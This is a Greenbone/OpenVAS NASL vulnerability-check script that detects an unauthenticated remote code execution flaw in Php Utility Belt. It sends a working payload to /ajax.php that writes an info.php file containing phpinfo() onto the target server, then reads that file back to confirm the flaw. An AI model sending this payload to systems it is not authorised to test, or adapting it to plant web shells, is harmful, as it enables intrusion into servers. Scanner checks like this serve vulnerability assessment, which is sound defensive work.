# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:php_utility_belt:php";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807614");
  script_version("2023-07-20T05:05:17+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-07-20 05:05:17 +0000 (Thu, 20 Jul 2023)");
  script_tag(name:"creation_date", value:"2016-03-16 10:38:20 +0530 (Wed, 16 Mar 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Php Utility Belt Multiple Vulnerabilities");

  script_tag(name:"summary", value:"Php Utility Belt is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET
  request and check whether it is able to read php information.");

  script_tag(name:"insight", value:"Multiple flaws are due to an insufficient
  validation of input in text field.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  unauthenticated remote attacker to conduct remote code execution, also
  allows them to gain system information.");

  script_tag(name:"affected", value:"Php Utility Belt.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/38901");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/39554");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_php_utility_belt_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("PhpUtilityBelt/Installed");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

host = http_host_name(port:port);

postData = "code=fwrite(fopen('info.php'%2C'w')%2C'%3C%3Fphp+echo+phpinfo()%3B%3F%3E')%3B";

req = 'POST ' + dir + '/ajax.php HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'Content-Length: 77\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
      '\r\n' +
      postData;

res = http_keepalive_send_recv(port:port, data:req);
if(res && res =~ "^HTTP/1\.[01] 200") {
  url = dir + '/info.php';

  if(http_vuln_check(port:port, url:url, pattern:">phpinfo\(\)<",
                     extra_check:make_list(">System", ">Configuration File"))) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}
